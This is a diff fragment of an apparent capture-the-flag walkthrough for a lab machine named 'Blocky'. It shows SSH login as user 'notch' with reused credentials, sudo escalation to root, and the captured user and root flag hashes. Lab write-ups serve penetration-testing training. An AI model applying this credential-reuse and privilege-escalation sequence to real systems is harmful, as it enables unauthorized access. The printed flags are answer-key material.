@@ -6,3 +6,54 @@
 
 
 ERROR: Invalid username. Lost your password?
+
+
+hippoeug@kali:~$ ssh root@10.129.1.53
+The authenticity of host '10.129.1.53 (10.129.1.53)' can't be established.
+ECDSA key fingerprint is SHA256:lg0igJ5ScjVO6jNwCH/OmEjdeO2+fx+MQhV/ne2i900.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.129.1.53' (ECDSA) to the list of known hosts.
+root@10.129.1.53's password: 
+Permission denied, please try again.
+root@10.129.1.53's password: 
+
+hippoeug@kali:~$ ssh notch@10.129.1.53
+notch@10.129.1.53's password: 
+Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-62-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+7 packages can be updated.
+7 updates are security updates.
+
+
+Last login: Thu Sep 24 08:12:11 2020 from 10.10.14.2
+notch@Blocky:~$ dir
+minecraft  user.txt
+notch@Blocky:~$ cat user.txt
+59fee0977fb60b8a0bc6e41e751f3cd5notch@Blocky:~$ 
+
+
+
+notch@Blocky:/$ dir
+bin  boot  dev  etc  home  initrd.img  lib  lib64  lost+found  media  mnt  opt  proc  root  run  sbin  snap  srv  sys  tmp  usr  var  vmlinuz  works
+notch@Blocky:/$ cd root
+-bash: cd: root: Permission denied
+notch@Blocky:/$ 
+                       
+                       
+                       
+notch@Blocky:/$ id
+uid=1000(notch) gid=1000(notch) groups=1000(notch),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)                                
+notch@Blocky:/$ sudo -i
+[sudo] password for notch: 
+Sorry, try again.
+[sudo] password for notch: 
+root@Blocky:~# dir
+dhcp.sh  root.txt
+root@Blocky:~# cat root.txt
+0a9694a5b4d272c694679f7860f1cd5froot@Blocky:~# 
+
+
